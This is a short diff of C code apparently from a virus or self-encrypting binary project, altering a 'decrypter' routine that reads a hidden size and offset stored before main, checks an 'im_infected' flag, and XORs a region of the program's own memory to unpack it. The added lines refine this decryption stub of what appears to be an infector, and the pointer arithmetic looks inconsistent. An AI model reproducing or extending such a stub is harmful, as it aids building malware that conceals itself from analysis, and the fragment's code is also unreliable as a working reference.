@@ -34,11 +34,13 @@ void decrypter(unsigned long address_of_main)
 	size_t	offset;
 	char	*start;
 
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	size = *(int *)(address_of_main - 4);
+	offset = *(int *)(address_of_main - sizeof(size) + sizeof(offset));
+	size = *(int *)(address_of_main - sizeof(size));
+	start = address_of_main + offset;
+	offset = 0;
 	if(size && im_infected(address_of_main))
 	{
-		start[offset] ^= *(int *)(address_of_main - 4);
+		start[offset] ^= *(int *)(address_of_main - 16);
 		offset++;
 		while (offset < size)
 		{
